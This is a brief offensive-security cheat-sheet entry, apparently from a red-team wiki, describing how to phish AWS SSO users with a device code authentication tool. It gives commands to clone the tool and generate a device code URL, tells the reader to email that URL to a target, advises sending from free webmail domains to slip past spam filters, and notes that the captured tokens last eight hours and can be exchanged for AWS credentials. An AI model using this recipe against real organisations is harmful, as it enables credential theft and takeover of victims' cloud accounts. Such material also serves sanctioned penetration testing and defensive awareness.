___
Exploit AWS SSO device code flows to trick users into authenticating and returning valid tokens.
Clone the AWS SSO Device Code Tool
```bash
git clone https://github.com/christophetd/aws-sso-device-code-authentication
cd aws-sso-device-code-authentication
```
**Generate a Device Code URL**
```bash
python main.py \
  --sso-start-url https://mycompany.awsapps.com/start \
  --sso-region us-east-1 \
  --output-file ./sso_token.json
```
This will display a URL of the form:
```bash
https://device.sso.us-east-1.amazonaws.com/?user_code=PPSR-PVFH
```
Send that URL to your target (e.g., via email). Once they enter the code, the tool will retrieve an SSO access token.

!!! info "note"
	Ensure your sender domain is unlikely to be flagged as spam. Commonly trusted domains include `gmail.com`, `hotmail.com`, `yahoo.com`, etc.

!!! info "note"
	After the user authenticates, you’ll receive AWS SSO tokens valid for 8 hours, which can be exchanged for AWS credentials.